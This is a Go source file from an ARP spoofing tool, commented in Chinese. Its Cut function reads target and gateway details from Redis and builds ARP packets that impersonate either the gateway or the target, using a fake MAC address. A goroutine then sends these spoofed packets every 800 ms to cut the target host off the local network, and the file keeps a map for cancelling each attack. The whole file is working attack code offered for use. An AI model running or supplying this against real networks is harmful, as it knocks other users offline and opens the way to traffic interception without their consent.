package logic

import (
	"ARPSpoofing/dao/redis"
	"ARPSpoofing/debug"
	"ARPSpoofing/models"
	"ARPSpoofing/pkg/arp"
	"ARPSpoofing/pkg/routine"
	"ARPSpoofing/settings"
	"ARPSpoofing/vars"
	"context"
	"log"
	"net"
	"time"

	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/sirupsen/logrus"
)

//Cut 断网功能
//@param method 欺骗方法 欺骗主机还是欺骗网关
//@param packetType 发包类型 请求包还是响应包
//@param gateway 网关的ip地址
//@param target 目标主机的ip地址
func Cut(method models.DeceitWay, packetType models.PacketType, gateway string, target string) error {
	//1.获取目标主机的详细信息
	hosts := redis.NewHosts()
	targetHost, err := hosts.Get(target)
	if err != nil {
		logrus.Errorf("hosts.Get(%s) failed,err:%v\n", target, err)
		return err
	}
	//2.获取网关的详细信息
	gatewayHost, err := hosts.Get(gateway)
	if err != nil {
		logrus.Errorf("hosts.Get(%s) failed,err:%v\n", gateway, err)
		return err
	}
	//3.准备表
	dstIPMap := map[models.DeceitWay]net.IP{
		models.DeceitTarget:  net.ParseIP(targetHost.IP),
		models.DeceitGateway: net.ParseIP(gatewayHost.IP),
	}
	srcIPMap := map[models.DeceitWay]net.IP{
		models.DeceitTarget:  net.ParseIP(gatewayHost.IP), //冒充网关
		models.DeceitGateway: net.ParseIP(targetHost.IP),  //冒充目标机
	}
	targetMAC, err := net.ParseMAC(targetHost.MAC)
	if err != nil {
		log.Println(err)
		return err
	}
	gatewayMAC, err := net.ParseMAC(gatewayHost.MAC)
	if err != nil {
		log.Println(err)
		return err
	}
	dstMACMap := map[models.DeceitWay]net.HardwareAddr{
		models.DeceitTarget:  targetMAC,
		models.DeceitGateway: gatewayMAC,
	}
	opMAP := map[models.PacketType]uint16{
		models.Request: layers.ARPRequest, //请求包
		models.Reply:   layers.ARPReply,   //响应包
	}
	//4.获取网卡名
	ifname, err := settings.Options.Get("ifname")
	if err != nil {
		log.Println("err")
		return err
	}
	handle, err := pcap.OpenLive(ifname, 65536, true, 1000)
	if err != nil {
		return err
	}
	//5.准备一个虚假的MAC地址
	srcMAC := net.HardwareAddr{0x66, 0x66, 0x66, 0x66, 0x66, 0x66}

	ctx, cancel := context.WithCancel(context.Background())
	host := models.HostWithCancel{
		IP:     targetHost.IP,
		Cancel: cancel,
	}
	go func() {
		debug.Println("启动了一个ARP欺骗协程:", routine.GetGID())
		defer debug.Println("ARP欺骗协程退出:", routine.GetGID())
		//6.开始滴答滴答地发邪恶的ARP欺骗包
		t := time.NewTicker(time.Millisecond * 800)
		defer t.Stop()
		for range t.C {
			err := arp.SendARP(handle,
				dstMACMap[method],
				srcMAC,
				dstMACMap[method],
				srcMAC,
				dstIPMap[method],
				srcIPMap[method],
				opMAP[packetType])
			if err != nil {
				log.Println("sent arp request failed,because ", err)
				return
			}
			select {
			case <-ctx.Done():
				return
			default:
			}
		}
	}()
	//6.维护一个 被断网的所有主机的数组
	vars.HostCancelMap[host.IP] = host.Cancel
	return nil
}
